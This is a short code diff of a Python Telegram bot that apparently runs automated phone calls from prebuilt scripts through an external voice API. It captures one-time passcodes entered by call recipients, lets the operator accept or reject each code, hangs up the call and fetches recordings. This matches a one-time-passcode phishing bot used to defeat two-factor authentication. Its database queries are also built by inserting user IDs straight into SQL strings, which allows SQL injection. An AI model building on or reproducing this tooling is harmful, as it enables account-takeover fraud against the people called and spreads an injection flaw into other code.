@@ -901,7 +901,6 @@ def recall_now(message):
 def custom_confirm1(message,otp_message):
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor() 
-    global accept_deny_handler
     chat_id = message.from_user.id
     up_resp1= otp_message
     c.execute(f"Select * from users where user_id={chat_id}")
@@ -927,7 +926,9 @@ def custom_confirm1(message,otp_message):
         requests.post(url, json=data)
         bot.send_message(chat_id,f"*Code Accpeted ✅ *",parse_mode='markdown')
         time.sleep(3)
-      
+        callhangup(call_control_id)
+
+
     elif up_resp1=='Deny':
         bot.send_message(chat_id,f"""*Code Rejected ❌*""",parse_mode='markdown')
         url = 'https://articunoapi.com:8443/gather-audio'
@@ -945,7 +946,7 @@ def custom_confirm1(message,otp_message):
         
 @app.route('/<script_id>/<chatid>/custom', methods=['POST'])
 def custom_prebuild_script_call(script_id,chatid):
-    global ringing_handler
+    global ringing_handler 
     global recording_handler
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor()
@@ -999,6 +1000,7 @@ def custom_prebuild_script_call(script_id,chatid):
             last_message_ids[chatid]=mesid
             c.execute(f"Update users set status='active' where user_id={chatid}")
             db.commit()
+
             try:
                  recurl =  recording_handler[call_control_id]
                  send_record = threading.Thread(target=retrive_recording, args=(recurl,chatid,))
